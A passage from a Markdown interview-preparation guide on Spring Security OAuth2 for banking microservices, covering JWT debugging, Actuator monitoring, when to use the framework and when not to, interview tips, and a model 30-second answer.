jwt decode eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# Or use jq
echo "eyJ..." | cut -d'.' -f2 | base64 -d | jq .

# Check token at runtime in Spring (add debug logging)
logging:
  level:
    org.springframework.security: DEBUG
    org.springframework.security.oauth2: TRACE
```

### Monitoring & Alerts

```yaml
# Spring Boot Actuator OAuth2 metrics
management:
  endpoints:
    web:
      exposure:
        include: health,metrics,prometheus
# Key metrics to monitor:
# spring.security.oauth2.client.token.requests (token fetch rate)
# http.server.requests with uri=/api/** and status=401 (unauthorized rate)
# spring.security.oauth2.resourceserver.jwt.decode (JWT decode latency)
```

---

## 📌 When to Use Spring Security OAuth2

- **Microservices architecture** — service-to-service and user-to-service auth
- **Open Banking / PSD2** — third-party TPP access to banking APIs
- **Mobile banking apps** — PKCE-based auth without client secrets
- **Partner API access** — scoped, revocable access for fintech partners
- **SSO across products** — single login for NetBanking, Mobile, Wealth portal
- **B2B integrations** — Client Credentials for system-to-system API calls
- **Multi-tenant SaaS** — per-tenant token issuance with tenant claims

---

## 🚫 When NOT to Use Spring Security OAuth2

- **Simple monolith with one user database** — Basic Auth or form login suffices
- **Internal batch jobs** — API keys or service accounts are simpler
- **IoT devices with no browser** — Device Authorization Flow needed (different complexity)
- **Ultra-low latency trading systems** — Even 1ms JWT validation may be unacceptable
- **Teams with no security expertise** — Misconfigured OAuth2 is worse than simpler alternatives

---

## 💡 Interview Tips

**What the interviewer expects:**
- Understand all four major grant types and when to use each
- Explain JWT structure (header.payload.signature) confidently
- Know the difference between Resource Server and Authorization Server
- Discuss security considerations (PKCE, token revocation, short TTL)
- Mention production concerns (JWK caching, clock skew, token relay)

**Common mistakes candidates make:**
- Confusing OAuth2 (Authorization) with OpenID Connect (Authentication)
- Not knowing PKCE — all 2024 interviews ask this
- Saying "we store tokens in localStorage" — instant red flag in BFSI
- Not mentioning `iss` and `aud` claim validation
- Confusing `scope` (OAuth2) and `role` (application-level)

**How to answer confidently:**
- Lead with the use case, then the flow, then the code
- Mention PKCE proactively — shows awareness of OAuth 2.1
- Relate to your project: "In our Danske Bank project, we used Client
  Credentials for AML service-to-service calls with 5-minute token TTL"
- Discuss trade-offs — JWT revocation vs opaque token overhead

**Follow-up questions to anticipate:**
- How do you handle token refresh silently in a SPA?
- What is the difference between `access_token` and `id_token`?
- How does Spring Security 6 differ from Spring Security 5 OAuth2?
- How would you implement API rate limiting per OAuth2 client?

---

## 📝 Short Conclusion Summary

Spring Security OAuth2 is the industry-standard framework for implementing
secure, delegated API access in Java enterprise applications. It provides
a complete implementation of the OAuth 2.0 Authorization Framework and
OpenID Connect, supporting multiple grant types suited for different
client scenarios — Authorization Code with PKCE for user-facing
applications, and Client Credentials for microservice-to-microservice
communication. In BFSI environments, its stateless JWT-based Resource
Server model enables horizontal scalability while maintaining robust
security through short-lived tokens, scope-based access control, and
local JWT validation using cached public keys. Mastering Spring Security
OAuth2 means understanding not just the API but the security reasoning
behind every design decision — from PKCE preventing code interception
to refresh token rotation limiting the blast radius of token theft.

---

## ⚡ TL;DR

| Topic | Summary |
|-------|---------|
| Purpose | Secure delegated API access without credential sharing |
| Internal Working | Authorization Code → Token Exchange → JWT validation via JWK |
| Best For | Microservices, Open Banking, Mobile Apps, SSO, Partner APIs |
| Avoid | Simple monoliths, batch jobs, ultra-low-latency trading |
| Advantages | Stateless, scalable, revocable, standard protocol, scoped access |
| Disadvantages | Complex setup, JWT not immediately revocable, operational overhead |
| Performance | JWT local validation ~1-2ms; cache JWK; Redis for token store |
| Interview Keyword | PKCE, JWK, RS256, Client Credentials, Token Relay, `jti`, OIDC |

---

## 🚀 30-Second Interview Answer

> "Spring Security OAuth2 implements the OAuth 2.0 Authorization
> Framework to provide secure, token-based delegated access to APIs
> without exposing user credentials. In our BFSI microservices, we use
> Authorization Code with PKCE for customer-facing portals and Client
> Credentials for service-to-service communication. The Resource Server
> validates JWT tokens locally using the Authorization Server's public
> key fetched from the JWK endpoint — making validation stateless and
> fast, typically under 2 milliseconds. We use RS256-signed JWTs with
> 15-minute TTL, scope-based access control at the method level via
> `@PreAuthorize`, and a Redis-backed token blocklist for immediate
> revocation on security incidents. Key security practices include
> mandatory PKCE, refresh token rotation, `iss` and `aud` claim
> validation, and never storing tokens in browser localStorage."